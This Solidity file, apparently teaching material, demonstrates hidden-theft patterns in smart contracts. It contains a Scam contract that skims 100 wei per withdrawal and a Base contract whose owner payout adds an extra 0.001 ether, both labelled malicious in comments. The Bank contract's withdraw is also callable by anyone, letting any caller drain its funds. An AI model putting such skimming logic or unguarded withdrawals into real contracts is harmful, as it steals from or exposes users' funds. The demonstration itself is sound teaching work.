// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/**
 * @title Bank Contract
 * @dev This contract allows deposits and withdrawals of Ether.
* @author Yaghoub Adelzadeh
* @notice Developed by Yaghoub Adelzadeh. For more information, visit: https://github.com/dappteacher
 */
contract Bank {
    /**
     * @notice Allows a user to deposit Ether into the contract.
     */
    function deposit() public payable {}

    /**
     * @notice Allows a user to withdraw a specified amount of Ether.
     * @param _receiver The address to receive the withdrawn Ether.
     * @param _amount The amount of Ether to withdraw.
     */
    function withdraw(address _receiver, uint256 _amount) public {
        (bool success,) = payable(_receiver).call{value: _amount}("");
        require(success, "Failed to send Ether!");
    }

    /**
     * @notice Fallback function to accept Ether deposits.
     */
    receive() external payable {}
}

/**
 * @title Base Contract
 * @notice This contract interacts with the Bank contract and includes a hidden malicious sendMoney function.
 */
contract Base {
    address owner;
    Bank bank;

    /**
     * @notice Constructor to set the Bank contract and owner address.
     * @param _bank The address of the Bank contract.
     */
    constructor(Bank _bank) {
        bank = _bank;
        owner = msg.sender;
    }

    mapping(address => uint256) balances;

    /**
     * @notice Allows a user to deposit Ether into the contract and forwards it to the Bank contract.
     */
    function deposit() public payable {
        require(msg.value > 0, "Put the money!!");
        balances[msg.sender] += msg.value;

        (bool sent,) = address(bank).call{value: msg.value}("");
        require(sent, "Failed to send Ether!");
    }

    /**
     * @notice Allows the owner to send money to a specified address, with a hidden malicious increment.
     * @param _receiver The address to receive the Ether.
     */
    function sendMoney(address _receiver) public onlyOwner {
        uint256 amount = balances[_receiver];
        amount += 0.001 ether; // Malicious increment of 0.001 Ether
        bank.withdraw(_receiver, amount);
    }

    /**
     * @notice Modifier to restrict function access to the contract owner.
     */
    modifier onlyOwner {
        require(msg.sender == owner, "Only Owner");
        _;
    }
}

/**
 * @title Scam Contract
 * @notice This contract has similar functionality to the Bank contract but includes a hidden malicious withdrawal function.
 */
contract Scam {
    /**
     * @notice Allows a user to deposit Ether into the contract.
     */
    function deposit() public payable {}

    /**
     * @notice Allows a user to withdraw a specified amount of Ether with a hidden reduction.
     * @param _receiver The address to receive the withdrawn Ether.
     * @param _amount The amount of Ether to withdraw.
     */
    function withdraw(address _receiver, uint256 _amount) public {
        _amount -= 100 wei; // Malicious reduction of 100 wei
        (bool success,) = payable(_receiver).call{value: _amount}("");
        require(success, "Failed to send Ether!");
    }

    /**
     * @notice Fallback function to accept Ether deposits.
     */
    receive() external payable {}
}
